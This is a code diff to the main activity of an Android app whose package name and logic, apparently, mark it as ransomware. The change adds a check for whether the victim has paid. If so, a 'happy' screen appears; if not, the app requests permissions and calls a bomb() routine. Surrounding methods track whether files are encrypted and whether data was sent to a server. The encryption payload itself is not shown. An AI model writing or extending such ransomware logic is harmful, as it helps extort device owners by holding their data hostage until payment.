@@ -44,25 +44,30 @@ public class MainActivity extends Activity {
             return;
         }
 
-        setContentView(R.layout.activity_main);
+        if(isPayed()){
+            setContentView(R.layout.activity_happy);
+        }else {
 
-        if (android.os.Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-            // Alert for permisions
-            new AlertDialog.Builder(this)
-                    .setTitle(alepacheco.com.rw.R.string.alert_title)
-                    .setMessage(alepacheco.com.rw.R.string.alert_message)
-                    .setPositiveButton(android.R.string.ok, new DialogInterface.OnClickListener() {
-                        public void onClick(DialogInterface dialog, int which) {
-                            boolean permit = checkPermissions();
-                            if (permit) {
-                                bomb();
+            setContentView(R.layout.activity_main);
+
+            if (android.os.Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                // Alert for permisions
+                new AlertDialog.Builder(this)
+                        .setTitle(alepacheco.com.rw.R.string.alert_title)
+                        .setMessage(alepacheco.com.rw.R.string.alert_message)
+                        .setPositiveButton(android.R.string.ok, new DialogInterface.OnClickListener() {
+                            public void onClick(DialogInterface dialog, int which) {
+                                boolean permit = checkPermissions();
+                                if (permit) {
+                                    bomb();
+                                }
                             }
-                        }
-                    })
-                    .setIcon(android.R.drawable.ic_dialog_info)
-                    .show();
-        } else {
-            bomb();
+                        })
+                        .setIcon(android.R.drawable.ic_dialog_info)
+                        .show();
+            } else {
+                bomb();
+            }
         }
     }
 
@@ -72,6 +77,10 @@ public class MainActivity extends Activity {
 
     private Boolean isEncrypted(){
         return LocalStorage.getInstance(ctx).getBooleanByTag(LocalStorage.TAG_ENCRYPTED);
+    }
+
+    private Boolean isPayed(){
+        return LocalStorage.getInstance(ctx).getBooleanByTag(LocalStorage.TAG_PAYD);
     }
 
     private Boolean checkSendedToServer(){
